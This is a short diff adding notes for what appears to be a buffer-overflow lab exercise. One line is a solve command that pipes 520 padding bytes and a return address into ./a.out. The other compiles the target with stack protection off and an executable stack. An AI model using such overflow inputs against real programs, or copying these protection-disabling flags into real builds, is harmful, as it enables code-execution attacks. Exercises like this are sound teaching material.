@@ -1,0 +1,2 @@
+example solve script --> python -c "print('a'*520 + '\xe7\x05\x40')" | ./a.out
+to compile file use --> gcc -fno-stack-protector -Wall -ggdb -O0 -fno-builtin -z execstack a.c
